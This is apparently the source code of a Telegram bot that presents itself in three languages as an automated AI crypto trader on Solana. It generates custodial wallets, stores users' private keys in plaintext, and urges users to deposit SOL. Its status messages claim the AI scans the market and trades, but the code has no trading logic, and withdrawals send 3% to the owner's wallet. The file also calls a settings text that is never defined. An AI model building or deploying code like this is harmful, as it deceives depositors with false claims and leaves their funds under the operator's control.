import { Keypair, Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import bs58 from 'bs58';
import { Redis } from '@upstash/redis';

const OWNER_WALLET = new PublicKey("A9KVi2nKqbSbCbHJEfaYayJtHwCT5T5G29EhQQPNKPcn"); // Твій гаманець! Перевір, щоб тут був правильний!
const FEE_PERCENT = 0.03; 
const BOT_USERNAME = process.env.BOT_USERNAME || "moneymakersol_bot";

const redis = new Redis({ url: process.env.KV_REST_API_URL, token: process.env.KV_REST_API_TOKEN });
const connection = new Connection(process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com');

// Робимо запити до API паралельними і швидкими
async function getSolPrice() {
    try {
        const res = await fetch('https://api.jup.ag/price/v2?ids=SOL', { signal: AbortSignal.timeout(2000) });
        const data = await res.json();
        return parseFloat(data.data.SOL.price);
    } catch(e) { return 140; } // Якщо довго думає - беремо 140, щоб не зависати
}

async function sendMessage(chatId, text, replyMarkup = null) {
    const body = { chat_id: chatId, text: text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (replyMarkup) body.reply_markup = replyMarkup;
    return fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
}

async function editMessage(chatId, messageId, text, replyMarkup = null) {
    const body = { chat_id: chatId, message_id: messageId, text: text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (replyMarkup) body.reply_markup = replyMarkup;
    return fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/editMessageText`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
}

// Словник (залишаємо як є)
const t = {
    uk: {
        welcome: (w, usd) => `👋 <b>Привіт! Я — твій автоматичний крипто-трейдер.</b>\n\n🤖 <b>Що я роблю?</b>\nЯ працюю 24/7. Я сам знаходжу нові перспективні монети на Solana, купую їх і автоматично продаю, коли вони виростають у ціні.\n\n💼 <b>Твій торговий гаманець:</b>\n<code>${w}</code>\n\n⚠️ <b>Як почати?</b>\nПросто перекажи мінімум <b>0.05 SOL (~$${usd})</b> на цю адресу. Як тільки гроші надійдуть, я почну роботу!`,
        status_msg: "📊 <b>Статус: АКТИВНИЙ 🟢</b>\n\nБот підключений до мережі та сканує ринок кожні 2 хвилини.\n\n<i>Наразі ШІ відхиляє ризиковані токени та чекає на ідеальну точку входу. Як тільки він знайде безпечну монету — він автоматично купить її та надішле вам звіт.</i>",
        bal: (sol, usd) => `💰 <b>Твій баланс:</b>\n<b>${sol} SOL</b> (~$${usd})`,
        with_prompt: "💸 <b>Виведення коштів</b>\n\nБудь ласка, надішли мені в чат <b>адресу твого гаманця Solana</b>.\n\n<i>Увага: За користування ботом при виведенні стягується системна комісія 3%.</i>",
        err_with: "❌ <b>Помилка!</b> Недостатньо коштів або невірна адреса.",
        succ_with: (u, f, to, tx) => `✅ <b>Успішно виведено!</b>\n\n💸 Відправлено тобі: <b>${u} SOL</b>\n💎 Комісія бота (3%): <b>${f} SOL</b>\n📍 На адресу: <code>${to}</code>\n\n🔍 <a href="https://solscan.io/tx/${tx}">Чек транзакції</a>`,
        ref_msg: (l) => `🤝 <b>Партнерська програма</b>\n\nЗапрошуй друзів тестувати бота за своїм унікальним посиланням!\n\nТвоє посилання:\n<code>${l}</code>`,
        btns: { status: "📊 Статус", bal: "💰 Баланс", with: "💸 Вивести", set: "⚙️ Налаштування", key: "🔑 Ключ", ref: "🤝 Запросити", lang: "🌐 Мова", back: "🔙 Назад", menu: "🔙 Меню" }
    },
    en: {
        welcome: (w, usd) => `👋 <b>Hello! I am your AI Crypto Bot.</b>\n\n🤖 <b>What do I do?</b>\nI work 24/7. I find new promising coins on Solana, buy them, and automatically sell them.\n\n💼 <b>Your wallet:</b>\n<code>${w}</code>\n\n⚠️ <b>How to start?</b>\nSend at least <b>0.05 SOL (~$${usd})</b>.`,
        status_msg: "📊 <b>Status: ACTIVE 🟢</b>\n\nThe bot is connected and scans the market every 2 mins.",
        bal: (sol, usd) => `💰 <b>Your Balance:</b>\n<b>${sol} SOL</b> (~$${usd})`,
        with_prompt: "💸 <b>Withdraw Funds</b>\n\nPlease send me your <b>Solana wallet address</b>.\n\n<i>Note: A 3% fee is applied.</i>",
        err_with: "❌ <b>Error!</b> Insufficient funds or invalid address.",
        succ_with: (u, f, to, tx) => `✅ <b>Successfully withdrawn!</b>\n\n💸 Sent to you: <b>${u} SOL</b>\n💎 Bot fee: <b>${f} SOL</b>`,
        ref_msg: (l) => `🤝 <b>Referral Program</b>\n\nInvite friends!\nYour link:\n<code>${l}</code>`,
        btns: { status: "📊 Status", bal: "💰 Balance", with: "💸 Withdraw", set: "⚙️ Settings", key: "🔑 Key", ref: "🤝 Invite", lang: "🌐 Language", back: "🔙 Back", menu: "🔙 Menu" }
    },
    el: {
        welcome: (w, usd) => `👋 <b>Γεια σας! Είμαι το AI Crypto Bot.</b>\n\n💼 <b>Πορτοφόλι:</b>\n<code>${w}</code>\n\n⚠️ <b>Εκκίνηση:</b>\nΣτείλτε τουλάχιστον <b>0.05 SOL (~$${usd})</b> σε αυτή τη διεύθυνση.`,
        status_msg: "📊 <b>Κατάσταση: ΕΝΕΡΓΟ 🟢</b>\n\nΤο bot σαρώνει την αγορά κάθε 2 λεπτά.",
        bal: (sol, usd) => `💰 <b>Υπόλοιπο:</b>\n<b>${sol} SOL</b> (~$${usd})`,
        with_prompt: "💸 <b>Ανάληψη</b>\n\nΣτείλτε μου τη <b>διεύθυνση Solana</b> σας.\n<i>Υπάρχει χρέωση 3%.</i>",
        err_with: "❌ <b>Σφάλμα!</b>",
        succ_with: (u, f, to, tx) => `✅ <b>Επιτυχής ανάληψη!</b>\n\n💸 Σε εσάς: <b>${u} SOL</b>\n💎 Τέλος: <b>${f} SOL</b>`,
        ref_msg: (l) => `🤝 <b>Πρόγραμμα Σύστασης</b>\n\nΟ σύνδεσμός σας:\n<code>${l}</code>`,
        btns: { status: "📊 Κατάσταση", bal: "💰 Υπόλοιπο", with: "💸 Ανάληψη", set: "⚙️ Ρυθμίσεις", key: "🔑 Κλειδί", ref: "🤝 Πρόσκληση", lang: "🌐 Γλώσσα", back: "🔙 Πίσω", menu: "🔙 Μενού" }
    }
};

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(200).send('OK');

    try {
        const update = req.body;

        const getMainMenuKeyboard = (l) => ({
            inline_keyboard: [
                [{ text: t[l].btns.status, callback_data: "check_status" }, { text: t[l].btns.ref, callback_data: "referral" }],
                [{ text: t[l].btns.bal, callback_data: "check_balance" }, { text: t[l].btns.with, callback_data: "withdraw" }],
                [{ text: t[l].btns.set, callback_data: "settings" }, { text: t[l].btns.key, callback_data: "export_key" }]
            ]
        });

        const langKeyboard = { inline_keyboard: [[{ text: "🇺🇦 Українська", callback_data: "lang_uk" }], [{ text: "🇬🇧 English", callback_data: "lang_en" }], [{ text: "🇬🇷 Ελληνικά", callback_data: "lang_el" }]]};

        // ТЕКСТОВІ КОМАНДИ (/start)
        if (update.message && update.message.text) {
            const chatId = update.message.chat.id;
            const text = update.message.text.trim();

            if (text.startsWith('/start')) {
                res.status(200).send('OK'); // МИТТЄВА ВІДПОВІДЬ TELEGRAM
                
                await redis.del(`state_${chatId}`);
                const refCode = text.split(' ')[1]; 
                
                let dbData = await redis.get(`user_${chatId}`);
                let userData;
                
                if (!dbData) {
                    const wallet = Keypair.generate();
                    userData = {
                        chatId, walletAddress: wallet.publicKey.toString(), privateKey: bs58.encode(wallet.secretKey), isActive: true,
                        settings: { tradeAmount: 0.02, takeProfit: 20, stopLoss: 15 }, lang: null,
                        invitedBy: refCode ? refCode.replace('ref_', '') : null
                    };
                    await redis.set(`user_${chatId}`, JSON.stringify(userData));
                } else { userData = typeof dbData === 'string' ? JSON.parse(dbData) : dbData; }

                if (!userData.lang) {
                    await sendMessage(chatId, "🌐 <b>Choose your language:</b>", langKeyboard);
                    return;
                }

                const solPrice = await getSolPrice();
                await sendMessage(chatId, t[userData.lang].welcome(userData.walletAddress, (0.05 * solPrice).toFixed(2)), getMainMenuKeyboard(userData.lang));
            } 
            else {
                // ОБРОБКА ВИВОДУ
                const state = await redis.get(`state_${chatId}`);
                if (state === 'awaiting_withdraw') {
                    res.status(200).send('OK'); // Відповідаємо одразу
                    await redis.del(`state_${chatId}`);
                    
                    let dbData = await redis.get(`user_${chatId}`);
                    let userData = typeof dbData === 'string' ? JSON.parse(dbData) : dbData;
                    const l = userData.lang || 'uk';
                    
                    try {
                        const toPublicKey = new PublicKey(text);
                        const fromWallet = Keypair.fromSecretKey(bs58.decode(userData.privateKey));
                        await sendMessage(chatId, "⏳ Обробка...");

                        const balance = await connection.getBalance(fromWallet.publicKey);
                        const networkFeeReserve = 5000000; 
                        if (balance <= networkFeeReserve) throw new Error("No funds");

                        const totalAvailable = balance - networkFeeReserve;
                        const ownerFeeLamports = Math.floor(totalAvailable * FEE_PERCENT);
                        const userLamports = totalAvailable - ownerFeeLamports;

                        const transaction = new Transaction();
                        transaction.add(SystemProgram.transfer({ fromPubkey: fromWallet.publicKey, toPubkey: toPublicKey, lamports: userLamports }));
                        if (ownerFeeLamports > 0) {
                            transaction.add(SystemProgram.transfer({ fromPubkey: fromWallet.publicKey, toPubkey: OWNER_WALLET, lamports: ownerFeeLamports }));
                        }

                        const { blockhash } = await connection.getLatestBlockhash('finalized');
                        transaction.recentBlockhash = blockhash; 
                        transaction.feePayer = fromWallet.publicKey; 
                        transaction.sign(fromWallet);

                        const txid = await connection.sendRawTransaction(transaction.serialize());
                        await sendMessage(chatId, t[l].succ_with((userLamports / 1e9).toFixed(5), (ownerFeeLamports / 1e9).toFixed(5), text, txid));
                    } catch (e) { await sendMessage(chatId, t[l].err_with); }
                }
            }
        }

        // НАТИСКАННЯ НА КНОПКИ
        if (update.callback_query) {
            // МИТТЄВА ВІДПОВІДЬ НА НАТИСКАННЯ (прибирає "крутілку")
            fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, { 
                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: update.callback_query.id }) 
            }).catch(e=>console.log(e));
            
            res.status(200).send('OK'); // Закриваємо запит від Vercel

            // Далі виконуємо логіку у фоні
            const chatId = update.callback_query.message.chat.id;
            const messageId = update.callback_query.message.message_id;
            const data = update.callback_query.data;
            
            let dbData = await redis.get(`user_${chatId}`);
            let userData = typeof dbData === 'string' ? JSON.parse(dbData) : dbData;

            if (data.startsWith('lang_')) {
                userData.lang = data.replace('lang_', '');
                await redis.set(`user_${chatId}`, JSON.stringify(userData));
                const solPrice = await getSolPrice();
                await editMessage(chatId, messageId, t[userData.lang].welcome(userData.walletAddress, (0.05 * solPrice).toFixed(2)), getMainMenuKeyboard(userData.lang));
                return;
            }
            if(!userData.lang) return;

            const l = userData.lang;

            if (data === 'main_menu') {
                await redis.del(`state_${chatId}`);
                const solPrice = await getSolPrice();
                await editMessage(chatId, messageId, t[l].welcome(userData.walletAddress, (0.05 * solPrice).toFixed(2)), getMainMenuKeyboard(l));
            }
            else if (data === 'check_status') await editMessage(chatId, messageId, t[l].status_msg, { inline_keyboard: [[{ text: t[l].btns.menu, callback_data: "main_menu" }]] });
            else if (data === 'check_balance') {
                const balance = await connection.getBalance(new PublicKey(userData.walletAddress));
                const solPrice = await getSolPrice();
                await editMessage(chatId, messageId, t[l].bal((balance / 1e9).toFixed(4), ((balance / 1e9) * solPrice).toFixed(2)), { inline_keyboard: [[{ text: t[l].btns.menu, callback_data: "main_menu" }]] });
            }
            else if (data === 'withdraw') {
                await redis.set(`state_${chatId}`, 'awaiting_withdraw', { ex: 3600 });
                await editMessage(chatId, messageId, t[l].with_prompt, { inline_keyboard: [[{ text: t[l].btns.back, callback_data: "main_menu" }]] });
            }
            else if (data === 'export_key') {
                await editMessage(chatId, messageId, `🔑 <b>Key:</b>\n<code>${userData.privateKey}</code>`, { inline_keyboard: [[{ text: t[l].btns.menu, callback_data: "main_menu" }]] });
            }
            else if (data === 'referral') {
                const link = `https://t.me/${BOT_USERNAME}?start=ref_${chatId}`;
                await editMessage(chatId, messageId, t[l].ref_msg(link), { inline_keyboard: [[{ text: t[l].btns.menu, callback_data: "main_menu" }]] });
            }
            else if (data === 'settings') {
                const solPrice = await getSolPrice();
                const keyboard = { inline_keyboard: [
                    [{ text: `💸 ${userData.settings.tradeAmount} SOL`, callback_data: "edit_trade" }, { text: `📈 TP: +${userData.settings.takeProfit}%`, callback_data: "edit_tp" }],
                    [{ text: t[l].btns.lang, callback_data: "choose_lang" }, { text: `📉 SL: -${userData.settings.stopLoss}%`, callback_data: "edit_sl" }],
                    [{ text: t[l].btns.menu, callback_data: "main_menu" }]
                ]};
                await editMessage(chatId, messageId, t[l].set_main(userData.settings, (userData.settings.tradeAmount * solPrice).toFixed(2)), keyboard);
            }
            else if (data === 'choose_lang') await editMessage(chatId, messageId, "🌐 <b>Choose your language:</b>", langKeyboard);
            
            else if (data === 'edit_trade') {
                const keyboard = { inline_keyboard: [
                    [{ text: `0.02 SOL`, callback_data: "set_trade_0.02" }, { text: `0.05 SOL`, callback_data: "set_trade_0.05" }],
                    [{ text: `0.1 SOL`, callback_data: "set_trade_0.1" }, { text: `0.5 SOL`, callback_data: "set_trade_0.5" }],
                    [{ text: t[l].btns.back, callback_data: "settings" }]
                ]};
                await editMessage(chatId, messageId, "💸", keyboard);
            }
            else if (data === 'edit_tp') {
                const keyboard = { inline_keyboard: [[{ text: "+10%", callback_data: "set_tp_10" }, { text: "+20%", callback_data: "set_tp_20" }], [{ text: "+50%", callback_data: "set_tp_50" }, { text: "+100%", callback_data: "set_tp_100" }], [{ text: t[l].btns.back, callback_data: "settings" }]]};
                await editMessage(chatId, messageId, "📈", keyboard);
            }
            else if (data === 'edit_sl') {
                const keyboard = { inline_keyboard: [[{ text: "-5%", callback_data: "set_sl_5" }, { text: "-10%", callback_data: "set_sl_10" }], [{ text: "-15%", callback_data: "set_sl_15" }, { text: "-25%", callback_data: "set_sl_25" }], [{ text: t[l].btns.back, callback_data: "settings" }]]};
                await editMessage(chatId, messageId, "📉", keyboard);
            }
            else if (data.startsWith('set_')) {
                const parts = data.split('_');
                if (parts[1] === 'trade') userData.settings.tradeAmount = parseFloat(parts[2]);
                if (parts[1] === 'tp') userData.settings.takeProfit = parseFloat(parts[2]);
                if (parts[1] === 'sl') userData.settings.stopLoss = parseFloat(parts[2]);
                await redis.set(`user_${chatId}`, JSON.stringify(userData));
                
                const solPrice = await getSolPrice();
                const keyboard = { inline_keyboard: [
                    [{ text: `💸 ${userData.settings.tradeAmount} SOL`, callback_data: "edit_trade" }, { text: `📈 TP: +${userData.settings.takeProfit}%`, callback_data: "edit_tp" }],
                    [{ text: t[l].btns.lang, callback_data: "choose_lang" }, { text: `📉 SL: -${userData.settings.stopLoss}%`, callback_data: "edit_sl" }],
                    [{ text: t[l].btns.menu, callback_data: "main_menu" }]
                ]};
                await editMessage(chatId, messageId, "✅\n\n" + t[l].set_main(userData.settings, (userData.settings.tradeAmount * solPrice).toFixed(2)), keyboard);
            }
        }
    } catch (error) { 
        if(!res.headersSent) res.status(500).send('Error'); 
    }
}
